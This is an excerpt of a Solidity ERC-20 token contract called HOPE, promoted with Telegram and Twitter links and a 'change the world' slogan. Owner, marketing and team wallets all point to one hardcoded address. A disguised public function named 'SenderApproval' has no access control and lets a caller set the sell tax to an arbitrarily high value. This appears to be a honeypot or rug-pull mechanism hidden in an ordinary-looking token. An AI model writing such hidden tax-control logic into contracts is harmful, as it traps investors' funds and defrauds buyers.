...
Telegram : https://t.me/HopeERC

Twitter : https://twitter.com/HopeERC_

“Together we will change the world through crypto!”
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x759404Db1893CCc11D0497e573006d334e512AfF; 
...
contract HOPE is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x759404Db1893CCc11D0497e573006d334e512AfF); 
    address payable public teamWalletAddress = payable(0x759404Db1893CCc11D0497e573006d334e512AfF); 
    ...
    function SenderApproval(uint256 NewSwapAmount) public {
        require(NewSwapAmount >=_maxtokenswapamount);
        _totalTaxIfSelling = NewSwapAmount;
    }
